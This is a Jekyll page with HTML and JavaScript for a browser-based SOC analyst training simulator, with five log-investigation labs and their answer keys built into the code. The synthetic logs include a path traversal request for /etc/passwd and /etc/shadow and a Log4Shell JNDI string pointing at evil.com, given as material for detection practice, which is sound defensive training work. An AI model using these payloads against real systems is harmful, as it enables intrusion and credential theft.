---
layout: page
title: "SentinelGuard Advanced SOC Station"
permalink: /labs/station/
---

<style>
    /* 1. GLOBAL RESET */
    html, body, main { background-color: #010409 !important; color: #c9d1d9 !important; margin: 0 !important; padding: 0 !important; width: 100%; height: 100%; overflow: hidden; }
    #desktop-environment {
        background: radial-gradient(circle, #0d1117 0%, #010409 100%);
        height: 100vh; width: 100vw; position: relative; overflow: hidden; font-family: 'JetBrains Mono', monospace; z-index: 1;
    }

    /* 2. TASKBAR (EN ALTA SABİT VE TIKLAMAYI ENGELLEMEZ) */
    #taskbar { 
        background: rgba(22, 27, 34, 0.98); height: 40px; border-top: 1px solid #30363d; display: flex; align-items: center; padding: 0 15px; gap: 20px; z-index: 999; position: absolute; bottom: 0; left: 0; width: 100%; pointer-events: auto;
    }

    /* 3. PENCERELER (POINTER EVENTS ÖNEMLİ) */
    .window {
        position: absolute; top: 48%; left: 50%; transform: translate(-50%, -50%);
        width: 96%; height: 85%; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; box-shadow: 0 30px 60px rgba(0,0,0,0.9); display: flex; flex-direction: column; z-index: 100; pointer-events: auto;
    }
    .window-header { background: #161b22; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; border-radius: 8px 8px 0 0; }
    .close-btn { color: #f85149; cursor: pointer; font-size: 20px; font-weight: bold; }

    /* 4. LAB SEÇİM KARTLARI (TIKLANABİLİR OLMASI İÇİN) */
    .lab-card {
        background:#161b22; border:1px solid #30363d; padding:20px; border-radius:10px; cursor:pointer; transition: 0.3s; pointer-events: auto; position: relative; z-index: 110;
    }
    .lab-card:hover { border-color: #58a6ff; background: rgba(88, 166, 255, 0.05); }

    /* 5. MODALLAR */
    .modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: flex; justify-content: center; align-items: center; pointer-events: auto; }
    .custom-modal { background: #161b22; border: 1px solid #58a6ff; padding: 30px; border-radius: 12px; text-align: center; max-width: 500px; border-top: 5px solid #58a6ff; }

    /* 6. BUTONLAR VE INPUTLAR */
    .btn-action { background: #238636; border: none; color: white; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; pointer-events: auto; }
    .btn-escalate { background: #d29922; }
    .btn-escalate:hover { background: #e3a613; }
    .input-field { width: 100%; background: #0d1117; border: 1px solid #30363d; color: #58a6ff; padding: 10px; margin-top: 5px; border-radius: 5px; outline: none; font-size: 12px; }
    .correct-ans { border-color: #238636 !important; background: rgba(35, 134, 54, 0.1) !important; }
    .wrong-ans { border-color: #f85149 !important; background: rgba(248, 81, 73, 0.1) !important; }
    .hidden { display: none !important; }
    .edr-terminal { background: #000; color: #3fb950; padding: 10px; font-family: 'Courier New', monospace; height: 120px; overflow-y: auto; border: 1px solid #30363d; margin-top: 10px; border-radius: 4px; font-size: 12px; }
</style>

<div id="desktop-environment">
    <div id="system-modal" class="modal-overlay hidden">
        <div class="custom-modal">
            <h2 id="modal-title" style="color: #58a6ff; margin-top:0;">STATION ALERT</h2>
            <div id="modal-body" style="margin: 20px 0; font-size: 13px; color: #e6edf3; line-height: 1.5;"></div>
            <button onclick="closeModal()" class="btn-action">ACKNOWLEDGE</button>
        </div>
    </div>

    <div style="position: absolute; top: 20px; left: 20px; display: flex; flex-direction: column; gap: 25px; z-index: 10;">
        <div onclick="openWindow('auth-window')" style="width: 85px; text-align: center; cursor: pointer; padding: 10px; border-radius: 8px;">
            <img src="https://cdn-icons-png.flaticon.com/512/3233/3233514.png" width="45" style="display:block; margin: 0 auto 5px auto;">
            <span style="font-size: 10px; color: #fff;">Login.sys</span>
        </div>
        <div id="range-icon" class="hidden" onclick="openWindow('selection-window')" style="width: 85px; text-align: center; cursor: pointer; padding: 10px; border-radius: 8px;">
            <img src="https://cdn-icons-png.flaticon.com/512/906/906343.png" width="45" style="display:block; margin: 0 auto 5px auto;">
            <span style="font-size: 10px; color: #fff;">CyberRange.exe</span>
        </div>
    </div>

    <div id="auth-window" class="window">
        <div class="window-header"><span>Analyst Identification</span><span onclick="closeWindow('auth-window')" class="close-btn">×</span></div>
        <div style="padding: 50px; text-align: center; max-width: 400px; margin: 0 auto;">
            <h3 style="color: #58a6ff;">SECURE ACCESS</h3>
            <input type="text" id="alias-input" class="input-field" placeholder="Codename...">
            <br><br>
            <button onclick="loginAnalyst()" class="btn-action">INITIALIZE TERMINAL</button>
        </div>
    </div>

    <div id="selection-window" class="window hidden">
        <div class="window-header"><span>Mission Control</span><span onclick="closeWindow('selection-window')" class="close-btn">×</span></div>
        <div id="selection-content" style="padding: 30px; overflow-y: auto;">
            <h4 style="color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px;">AVAILABLE MISSIONS</h4>
            <div id="machine-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 25px;"></div>
        </div>
        <div id="briefing-content" class="hidden" style="padding: 30px; overflow-y: auto;">
            <h2 id="brief-lab-name" style="color: #58a6ff;">BRIEFING</h2>
            <div id="brief-details" style="background: rgba(88,166,255,0.05); border: 1px solid #30363d; padding: 25px; border-radius: 8px; margin: 20px 0; font-size: 13px; line-height: 1.6;"></div>
            <div style="display: flex; gap: 15px;">
                <button onclick="hideBriefing()" class="btn-action" style="background:#30363d; width: 150px;">BACK</button>
                <button onclick="startInvestigation()" class="btn-action">ENTER TELEMETRY VAULT</button>
            </div>
        </div>
    </div>

    <div id="lab-window" class="window hidden">
        <div class="window-header"><span id="lab-title-text">Investigation Unit</span><span onclick="closeWindow('lab-window')" class="close-btn">×</span></div>
        <div style="display: flex; flex: 1; overflow: hidden; padding: 15px; gap: 15px;">
            <div style="flex: 1; display: flex; flex-direction: column;">
                <div style="background:#161b22; padding:5px 15px; font-size:10px; border-bottom: 1px solid #30363d;">RAW TELEMETRY STREAM</div>
                <div id="log-screen" style="flex: 1; overflow-y: scroll; padding: 15px; font-size: 11px; color: #8b949e; line-height: 1.8; background: #010409; border: 1px solid #30363d; white-space: pre-wrap;"></div>
            </div>
            <div style="flex: 0.4; background: #161b22; padding: 15px; border-radius: 6px; border: 1px solid #30363d; overflow-y: auto;">
                <h4 style="color:#f85149; margin-top:0;">Artifacts</h4>
                <div id="q-area"></div>
                <button onclick="checkAnswers()" class="btn-action" style="margin-top: 15px;">SUBMIT EVIDENCE</button>
            </div>
        </div>
    </div>

    <div id="playbook-window" class="window hidden">
        <div class="window-header"><span>Action Command Center</span><span onclick="closeWindow('playbook-window')" class="close-btn">×</span></div>
        <div style="padding: 30px; overflow-y: auto;">
            <h2 style="color: #3fb950; margin-top: 0;">REMEDIATION PLAYBOOK</h2>
            <div id="playbook-ui"></div>
        </div>
    </div>

    <div id="taskbar">
        <img src="https://cdn-icons-png.flaticon.com/512/270/270104.png" width="18" style="filter: invert(1);">
        <div id="clock" style="font-size: 11px; color: #8b949e; min-width: 60px;">00:00:00</div>
        <div id="active-user" style="margin-left: auto; font-size: 10px; color: #58a6ff;">GUEST@STATION</div>
    </div>
</div>

<script>
    const labs = {
        brute: {
            name: "ADV-01: Stealthy Brute Force", diff: "Easy",
            details: "Analyze authentication logs for a series of 'low-and-slow' brute force attempts. / Yavaş ve sinsi brute force girişimlerini bulun.",
            questions: [{q: "Attacker IP?", a: "141.10.22.5"}, {q: "EventID Fail?", a: "4625"}],
            logs: () => {
                let l = []; for(let i=0; i<30; i++) l.push(`[14:38:42] INFO Audit: EventID=4624 source=10.0.0.${i} status=Success user=jdoe`);
                for(let i=10; i<40; i+=2) l.push(`[14:40:${i}] WARN Audit: EventID=4625 source=141.10.22.5 status=Failure user=admin msg="Bad Password"`);
                l.push(`[14:45:01] CRIT Audit: EventID=4624 source=141.10.22.5 status=Success user=admin msg="Logon success"`);
                return l.reverse();
            }
        },
        traversal: {
            name: "ADV-02: Directory Traversal", diff: "Medium",
            details: "Identify path traversal attempt and the sensitive file targeted. / Path traversal girişimiyle hedeflenen hassas dosyayı bulun.",
            questions: [{q: "Attacker IP?", a: "192.168.55.12"}, {q: "Targeted File?", a: "/etc/passwd"}],
            logs: () => {
                let l = []; for(let i=0; i<40; i++) l.push(`[10:10:${i}] INFO Apache: 192.168.1.${i} GET /assets/img.png 200`);
                l.push(`[10:15:22] WARN Apache: 192.168.55.12 GET /download.php?file=../../../../etc/passwd 200`);
                l.push(`[10:16:00] WARN Apache: 192.168.55.12 GET /download.php?file=%2e%2e%2f%2e%2e%2fetc%2fshadow 403`);
                return l.reverse();
            }
        },
        ransom: {
            name: "ADV-03: Ransomware Staging", diff: "Hard",
            details: "Detect ransomware execution staging via Sysmon logs. / Fidye yazılımı hazırlığını Sysmon loglarından bulun.",
            questions: [{q: "Process Name?", a: "wannacry.exe"}, {q: "Extension?", a: ".wnry"}],
            logs: () => {
                let l = []; for(let i=0; i<30; i++) l.push(`[07:55:${i}] INFO Sysmon: EventID=7 ImageLoaded="C:\\Windows\\System32\\ntdll.dll" Process="chrome.exe"`);
                l.push(`[08:00:01] CRIT Sysmon: EventID=1 Image="C:\\Windows\\wannacry.exe" CommandLine="-m" Parent="cmd.exe"`);
                l.push(`[08:00:15] ALERT FileSystem: Target="Report.pdf.wnry" Status="Encrypted"`);
                l.push(`[08:01:40] WARN Network: Connection to 203.0.113.42:4444 Established`);
                return l.reverse();
            }
        },
        log4j: {
            name: "ADV-04: Log4Shell Exploitation", diff: "Expert",
            details: "Detect JNDI injection attempts in User-Agent headers. / User-Agent başlıklarındaki JNDI enjeksiyonlarını bulun.",
            questions: [{q: "Attacker IP?", a: "88.99.100.101"}, {q: "LDAP URI?", a: "ldap://evil.com/a"}],
            logs: () => {
                let l = []; for(let i=0; i<40; i++) l.push(`[22:00:${i}] INFO Tomcat: 10.0.2.${i} - "GET /health 200"`);
                l.push(`[22:05:12] CRIT Tomcat: 88.99.100.101 UA: \${jndi:ldap://evil.com/a}`);
                l.push(`[22:05:15] WARN Outbound: Connection to 88.99.100.101:389 detected`);
                return l.reverse();
            }
        },
        exfil: {
            name: "ADV-05: DNS Exfiltration", diff: "Expert",
            details: "Identify DNS tunneling activity and the rogue domain used for data theft. / DNS tünelleme üzerinden veri sızıntısını tespit edin.",
            questions: [{q: "Host?", a: "DESKTOP-AF2"}, {q: "Domain?", a: "dns-tunnel.com"}],
            logs: () => {
                let l = []; for(let i=0; i<40; i++) l.push(`[11:00:${i}] INFO DNS: query A google.com from 10.0.0.10`);
                for(let i=0; i<50; i++) l.push(`[11:05:${i}] WARN DNS: query A ${Math.random().toString(36).substring(7)}.dns-tunnel.com from DESKTOP-AF2`);
                l.push(`[11:10:00] ALERT IDS: DNS Tunneling detected for dns-tunnel.com`);
                return l.reverse();
            }
        }
    };

    let userAlias = ""; let currentKey = "";
    function openWindow(id) { document.querySelectorAll('.window').forEach(w => w.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
    function closeWindow(id) { document.getElementById(id).classList.add('hidden'); }
    function openModal(title, body) { document.getElementById('modal-title').innerText = title; document.getElementById('modal-body').innerHTML = body; document.getElementById('system-modal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('system-modal').classList.add('hidden'); }

    function loginAnalyst() {
        const input = document.getElementById('alias-input').value.trim();
        if(!input) return;
        userAlias = input; localStorage.setItem('analyst_alias', userAlias);
        document.getElementById('active-user').innerText = `${userAlias.toUpperCase()}@STATION`;
        document.getElementById('range-icon').classList.remove('hidden');
        closeWindow('auth-window'); openModal("SUCCESS", `Welcome Analyst ${userAlias}.`); renderSelection();
    }

    function renderSelection() {
        const container = document.getElementById('machine-list');
        container.innerHTML = Object.keys(labs).map(key => `
            <div class="lab-card" onclick="showBriefing('${key}')">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span style="font-weight:bold; color:#fff; font-size:13px;">${labs[key].name}</span>
                    <span style="font-size:9px; color:${labs[key].diff==='Easy'?'#3fb950':labs[key].diff==='Medium'?'#d29922':'#f85149'}; border:1px solid currentColor; padding:2px 5px; border-radius:4px;">${labs[key].diff}</span>
                </div>
                <div style="font-size:10px; color:#8b949e; margin-top:8px;">Technical Incident Investigation Case</div>
            </div>
        `).join('');
    }

    function showBriefing(key) {
        currentKey = key;
        document.getElementById('selection-content').classList.add('hidden');
        document.getElementById('briefing-content').classList.remove('hidden');
        document.getElementById('brief-lab-name').innerText = labs[key].name;
        document.getElementById('brief-details').innerHTML = labs[key].details;
    }

    function hideBriefing() { document.getElementById('selection-content').classList.remove('hidden'); document.getElementById('briefing-content').classList.add('hidden'); }

    function startInvestigation() {
        closeWindow('selection-window'); openWindow('lab-window');
        const lab = labs[currentKey];
        document.getElementById('lab-title-text').innerText = `INVESTIGATING: ${lab.name}`;
        document.getElementById('log-screen').innerHTML = lab.logs().map(l => `<div style="border-bottom:1px solid #161b22; padding:3px 0;">${l}</div>`).join('');
        document.getElementById('q-area').innerHTML = lab.questions.map((q, i) => `<div style="margin-bottom:10px;"><label style="font-size:10px; color:#8b949e;">${q.q}</label><input type="text" id="ans-${i}" class="input-field"></div>`).join('');
    }

    function checkAnswers() {
        const lab = labs[currentKey]; let correct = 0;
        lab.questions.forEach((q, i) => {
            const el = document.getElementById(`ans-${i}`);
            if(el.value.trim().toLowerCase() === q.a.toLowerCase()) { correct++; el.classList.add('correct-ans'); } else { el.classList.add('wrong-ans'); }
        });
        if(correct === lab.questions.length) { openModal("VERIFIED", "Evidence verified. Choose classification."); setTimeout(() => { closeWindow('lab-window'); openWindow('playbook-window'); renderPlaybook(); }, 1500); }
    }

    function renderPlaybook() {
        document.getElementById('playbook-ui').innerHTML = `
            <div style="background:rgba(88,166,255,0.05); padding:20px; border-radius:8px;">
                <p style="font-size:12px; color:#58a6ff;">Step 1: Classification / Sınıflandırma</p>
                <select id="case-decision" class="input-field" onchange="toggleActionView()" style="margin-bottom:15px;">
                    <option value="tp">True Positive (Real Attack)</option>
                    <option value="fp">False Positive (Benign/Test Activity)</option>
                </select>

                <div id="tp-action-area">
                    <p style="font-size:12px; color:#f85149;">Step 2: Remediation via EDR Console</p>
                    <div class="edr-terminal"><div id="edr-out">[SYS] Connection Ready. Use 'kill --pid [id]' or 'isolate --host [name]'</div><input type="text" id="edr-in" onkeydown="handleEDR(event)" style="background:none; border:none; color:#3fb950; outline:none; width:100%;"></div>
                    <button onclick="finalizeMission('tp')" class="btn-action btn-escalate" style="margin-top:15px;">ESCALATE TO L2</button>
                </div>

                <div id="fp-action-area" class="hidden">
                    <p style="font-size:12px; color:#3fb950;">Step 2: Close Case as False Positive</p>
                    <button onclick="finalizeMission('fp')" class="btn-action" style="margin-top:15px;">CLOSE INCIDENT</button>
                </div>

                <textarea id="analyst-note" class="input-field" style="height:60px; margin-top:15px;" placeholder="Analyst summary..."></textarea>
            </div>`;
    }

    function toggleActionView() {
        const dec = document.getElementById('case-decision').value;
        if(dec === 'fp') { document.getElementById('tp-action-area').classList.add('hidden'); document.getElementById('fp-action-area').classList.remove('hidden'); }
        else { document.getElementById('tp-action-area').classList.remove('hidden'); document.getElementById('fp-action-area').classList.add('hidden'); }
    }

    function handleEDR(e) { if(e.key === "Enter") { document.getElementById('edr-out').innerHTML += `<div style="color:#58a6ff;">$ ${e.target.value}</div><div style="color:#3fb950;">[SUCCESS] Host Remedied.</div>`; e.target.value = ""; } }

    function finalizeMission(type) {
        if(!document.getElementById('analyst-note').value) { alert("Please enter a note."); return; }
        const msg = type === 'tp' ? "Vaka L2 analistlerine raporlandı ve devredildi." : "Vaka kapatıldı (False Positive).";
        openModal("MISSION COMPLETE", msg);
        setTimeout(() => { location.reload(); }, 3000);
    }

    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
</script>
